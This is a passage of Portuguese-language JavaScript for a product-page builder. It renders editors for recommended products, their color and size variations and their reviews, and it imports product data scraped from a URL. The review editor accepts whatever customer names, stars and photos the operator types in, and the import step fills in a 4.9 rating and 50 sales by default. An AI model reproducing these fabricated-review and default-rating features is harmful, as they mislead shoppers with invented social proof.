        
        <div style="margin-bottom: 15px;">
            <label style="display: block; font-weight: 600; margin-bottom: 5px; font-size: 13px;">Imagens Adicionais (URLs separadas por virgula)</label>
            <textarea class="rec-additional-images" style="width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 6px; min-height: 60px;" placeholder="Cole URLs de imagens adicionais separadas por virgula">${escContent((data.additionalImages || []).join(', '))}</textarea>
        </div>
        
        <div style="margin-bottom: 15px;">
            <label style="display: block; font-weight: 600; margin-bottom: 5px; font-size: 13px;">Descricao do Produto</label>
            <textarea class="rec-description" style="width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 6px; min-height: 100px;">${escContent(data.description)}</textarea>
        </div>
        
        <div style="margin-bottom: 15px;">
            <label style="display: block; font-weight: 600; margin-bottom: 5px; font-size: 13px;">Imagens da Descricao (URLs separadas por virgula)</label>
            <textarea class="rec-description-images" style="width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 6px; min-height: 60px;" placeholder="Cole URLs de imagens da descricao separadas por virgula">${escContent((data.descriptionImages || []).join(', '))}</textarea>
        </div>
        
        <details style="margin-bottom: 15px; background: #f8fafc; padding: 15px; border-radius: 8px;">
            <summary style="cursor: pointer; font-weight: 600; color: #111;">Variacoes - Cores (${(data.colors || []).length})</summary>
            <div style="margin-top: 10px;">
                <label style="display: block; font-weight: 600; margin-bottom: 5px; font-size: 13px;">Titulo da Variacao 1</label>
                <input type="text" class="rec-variation1-title" value="${esc(data.variation1Title) || 'Cor'}" style="width: 100%; padding: 8px; border: 1px solid #ddd; border-radius: 4px; margin-bottom: 10px;">
                <div class="rec-color-options">${colorsHtml}</div>
                <button onclick="addRecColorOption(this.parentElement.querySelector('.rec-color-options'));" style="background: #111; color: white; border: none; padding: 8px 16px; border-radius: 4px; cursor: pointer; margin-top: 5px;">+ Adicionar Cor</button>
            </div>
        </details>
        
        <details style="margin-bottom: 15px; background: #f8fafc; padding: 15px; border-radius: 8px;">
            <summary style="cursor: pointer; font-weight: 600; color: #111;">Variacoes - Tamanhos (${(data.sizes || []).length})</summary>
            <div style="margin-top: 10px;">
                <label style="display: block; font-weight: 600; margin-bottom: 5px; font-size: 13px;">Titulo da Variacao 2</label>
                <input type="text" class="rec-variation2-title" value="${esc(data.variation2Title) || 'Tamanho'}" style="width: 100%; padding: 8px; border: 1px solid #ddd; border-radius: 4px; margin-bottom: 10px;">
                <div class="rec-size-options">${sizesHtml}</div>
                <button onclick="addRecSizeOption(this.parentElement.querySelector('.rec-size-options'));" style="background: #111; color: white; border: none; padding: 8px 16px; border-radius: 4px; cursor: pointer; margin-top: 5px;">+ Adicionar Tamanho</button>
            </div>
        </details>
        
        <details style="margin-bottom: 15px; background: #fdf4ff; padding: 15px; border-radius: 8px;">
            <summary style="cursor: pointer; font-weight: 600; color: #a21caf;">Avaliacoes do Produto (${(data.reviews || []).length})</summary>
            <div style="margin-top: 10px;">
                <div class="rec-reviews-container">${reviewsHtml}</div>
                <button onclick="addRecReviewLegacy(this.parentElement.querySelector('.rec-reviews-container'));" style="background: #a21caf; color: white; border: none; padding: 8px 16px; border-radius: 4px; cursor: pointer; margin-top: 5px;">+ Adicionar Avaliacao</button>
            </div>
        </details>
    `;
    
    container.appendChild(div);
    
    // Atualizar preview com protecao contra erros
    try {
        if (typeof updateOutputDebounced === 'function') {
            updateOutputDebounced();
        }
    } catch (e) {
        console.error('[v0] Erro ao atualizar preview:', e);
    }
}

// Funcoes auxiliares para adicionar opcoes nas recomendacoes
function addRecColorOption(container) {
    const div = document.createElement('div');
    div.className = 'option-item';
    div.style.cssText = 'display: flex; flex-wrap: wrap; gap: 8px; margin-bottom: 8px; align-items: center;';
    div.innerHTML = `
        <input type="text" class="rec-color-name" placeholder="Nome da cor" style="flex: 1; min-width: 100px; padding: 8px; border: 1px solid #ddd; border-radius: 4px;">
        <input type="text" class="rec-color-image-url" placeholder="URL da imagem" style="flex: 2; min-width: 150px; padding: 8px; border: 1px solid #ddd; border-radius: 4px;">
        <input type="text" class="rec-color-price" placeholder="Preco" style="width: 80px; padding: 8px; border: 1px solid #ddd; border-radius: 4px;">
        <input type="hidden" class="rec-color-checkout-url" value="">
        <button class="remove-btn" onclick="this.parentElement.remove(); if(typeof updateOutputDebounced === 'function') updateOutputDebounced();" style="background: #ef4444; color: white; border: none; padding: 8px 12px; border-radius: 4px; cursor: pointer;">X</button>
    `;
    container.appendChild(div);
}

function addRecSizeOption(container) {
    const div = document.createElement('div');
    div.className = 'option-item';
    div.style.cssText = 'display: flex; gap: 8px; margin-bottom: 8px; align-items: center;';
    div.innerHTML = `
        <input type="text" class="rec-size-name" placeholder="Tamanho" style="flex: 1; padding: 8px; border: 1px solid #ddd; border-radius: 4px;">
        <button class="remove-btn" onclick="this.parentElement.remove(); if(typeof updateOutputDebounced === 'function') updateOutputDebounced();" style="background: #ef4444; color: white; border: none; padding: 8px 12px; border-radius: 4px; cursor: pointer;">X</button>
    `;
    container.appendChild(div);
}

function addRecReviewLegacy(container) {
  const div = document.createElement('div');
  div.className = 'rec-review-item';
  div.style.cssText = 'background: #f8fafc; padding: 12px; border-radius: 8px; margin-bottom: 10px; border: 1px solid #e5e7eb;';
  div.innerHTML = `
      <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-bottom: 8px;">
          <div>
              <label style="display: block; font-size: 11px; color: #666; margin-bottom: 2px;">Nome do Cliente</label>
              <input type="text" class="rec-rev-name" placeholder="Nome" style="width: 100%; padding: 6px; border: 1px solid #ddd; border-radius: 4px;">
          </div>
          <div>
              <label style="display: block; font-size: 11px; color: #666; margin-bottom: 2px;">Estrelas (1-5)</label>
              <input type="number" class="rec-rev-stars" placeholder="5" value="5" min="1" max="5" style="width: 100%; padding: 6px; border: 1px solid #ddd; border-radius: 4px;">
          </div>
      </div>
      <div style="margin-bottom: 8px;">
          <label style="display: block; font-size: 11px; color: #666; margin-bottom: 2px;">Imagem de Perfil (Avatar)</label>
          <input type="text" class="rec-rev-avatar" placeholder="URL do avatar" style="width: 100%; padding: 6px; border: 1px solid #ddd; border-radius: 4px;">
      </div>
      <div style="margin-bottom: 8px;">
          <label style="display: block; font-size: 11px; color: #666; margin-bottom: 2px;">Item Comprado</label>
          <input type="text" class="rec-rev-details" placeholder="Item: Cor, Tamanho" style="width: 100%; padding: 6px; border: 1px solid #ddd; border-radius: 4px;">
      </div>
      <div style="margin-bottom: 8px;">
          <label style="display: block; font-size: 11px; color: #666; margin-bottom: 2px;">Texto da Avaliacao</label>
          <textarea class="rec-rev-text" placeholder="Texto da avaliacao" style="width: 100%; padding: 6px; border: 1px solid #ddd; border-radius: 4px; min-height: 60px;"></textarea>
      </div>
      <div style="margin-bottom: 8px;">
          <label style="display: block; font-size: 11px; color: #666; margin-bottom: 2px;">Foto do Produto Recebido</label>
          <input type="text" class="rec-rev-img" placeholder="URL da foto do produto" style="width: 100%; padding: 6px; border: 1px solid #ddd; border-radius: 4px;">
      </div>
      <button onclick="this.parentElement.remove(); if(typeof updateOutputDebounced === 'function') updateOutputDebounced();" style="background: #ef4444; color: white; border: none; padding: 6px 12px; border-radius: 4px; cursor: pointer; font-size: 12px;">Remover Avaliacao</button>
  `;
  container.appendChild(div);
}

// Funcao para buscar produto por URL para recomendacao
async function fetchProductForRecommendation() {
    const urlInput = document.getElementById('rec-product-url-input');
    const statusEl = document.getElementById('rec-loading-status');
    
    if (!urlInput) return;
    
    const productUrl = urlInput.value.trim();
    if (!productUrl) {
        alert('Insira o link do produto.');
        return;
    }
    
    if (statusEl) statusEl.innerText = 'Buscando dados...';
    
    try {
        if (typeof fetchAndParseProductData !== 'function') {
            throw new Error('Parser nao encontrado.');
        }
        
        const extractedData = await fetchAndParseProductData(productUrl, statusEl);
        
        // Obter logo do produto principal
        const mainStoreLogo = document.getElementById('store-logo-url')?.value || extractedData.storeLogoUrl || '';
        const mainStoreName = document.getElementById('store-name')?.value || extractedData.storeName || '';
        
        // Criar objeto de recomendacao com todos os dados
        const recProduct = {
            title: extractedData.productTitle || extractedData.title || '',
            productTitle: extractedData.productTitle || extractedData.title || '',
            currentPrice: extractedData.currentPrice || extractedData.price || '',
            originalPrice: extractedData.originalPrice || extractedData.oldPrice || '',
            mainImage: extractedData.mainImage || extractedData.imageUrl || '',
            additionalImages: extractedData.additionalImages || [],
            description: extractedData.productDescription || extractedData.description || '',
            descriptionImages: extractedData.descriptionImages || [],
            productRating: extractedData.productRating || '4.9',
            salesCount: extractedData.salesCount || '50',
            storeName: mainStoreName,
            storeLogoUrl: mainStoreLogo,
            colors: extractedData.colors || [],
            sizes: extractedData.sizes || [],
            reviews: extractedData.reviews || [],
            variation1Title: extractedData.variation1Title || 'Cor',
            variation2Title: extractedData.variation2Title || 'Tamanho'
        };
        
        addRecProduct(recProduct);
        
        urlInput.value = '';
        if (statusEl) statusEl.innerText = 'Produto adicionado: ' + recProduct.title.substring(0, 30) + '...';
        
    } catch (error) {
        if (statusEl) statusEl.innerText = 'Erro: ' + error.message;
    }
}
